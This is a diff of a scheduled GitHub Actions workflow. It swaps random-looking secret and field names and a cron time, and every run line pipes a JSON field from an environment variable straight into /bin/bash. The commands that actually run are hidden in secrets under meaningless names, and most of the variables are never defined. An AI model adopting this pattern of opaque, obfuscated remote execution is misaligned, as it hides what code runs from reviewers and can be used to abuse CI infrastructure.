@@ -1,8 +1,9 @@
 name: qushubin2418
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 5/6 * * *'
+    - cron: '55 1/6 * * *'
 
 jobs:
   build:
@@ -11,17 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: qushubin2418
         env:
-          ljipn724: ${{ secrets.ljipn724 }}
+          pqbt02778: ${{ secrets.pqbt02778 }}
         run: |
-          echo $ljipn724 | jq -r .m531 | /bin/bash
-          echo $im9989 | jq -r .olkqj607 | /bin/bash
-          echo $ti37492 | jq -r .j41364 | /bin/bash
-          echo $cmvhr9 | jq -r .gch33 | /bin/bash
-          echo $j49 | jq -r .qbtvx75 | /bin/bash
-          echo $sgxa11266 | jq -r .gy1 | /bin/bash
-          echo $vs27 | jq -r .cq6 | /bin/bash
-          echo $qfm5 | jq -r .xbzx3 | /bin/bash
-          echo $pm42 | jq -r .gduut3772 | /bin/bash
-          echo $okp085 | jq -r .y802 | /bin/bash
-          echo $ln40 | jq -r .dixfu60427 | /bin/bash
+          echo $pqbt02778 | jq -r .pa11938 | /bin/bash
+          echo $qc85763 | jq -r .z85866 | /bin/bash
+          echo $ekw82 | jq -r .py4239 | /bin/bash
+          echo $aief216 | jq -r .z57437 | /bin/bash
+          echo $gwht6087 | jq -r .crhyu23609 | /bin/bash
+          echo $vbgri48 | jq -r .lsgvz81320 | /bin/bash
 
